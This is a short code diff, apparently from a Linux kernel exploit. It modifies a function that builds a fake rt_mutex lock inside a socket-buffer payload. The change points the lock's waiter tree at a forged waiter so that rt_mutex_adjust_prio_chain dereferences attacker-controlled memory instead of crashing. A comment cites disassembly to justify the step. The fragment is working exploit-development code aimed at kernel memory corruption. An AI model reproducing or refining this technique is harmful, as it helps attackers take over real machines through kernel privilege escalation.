@@ -504,8 +504,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      put64(p, LOCK_OFF + 0x08, 0);
-      put64(p, LOCK_OFF + 0x10, 0);
+      /* owner==NULL branch of rt_mutex_adjust_prio_chain does
+       * wake_up_state(lock->waiters.rb_leftmost->task, ...) without a
+       * leftmost NULL check (verified by disasm @ adjust_prio_chain+0x820:
+       * cbz x8 skips only the lock-check, then ldr x0,[x8,#0x30] panics).
+       * Point waiters tree at fake_w0 so leftmost derefs stay in our page. */
+      put64(p, LOCK_OFF + 0x08, fake_w0);
+      put64(p, LOCK_OFF + 0x10, fake_w0);
       put64(p, LOCK_OFF + 0x18, 0);
     } else {
       put64(p, LOCK_OFF + 0x08, fake_w0);
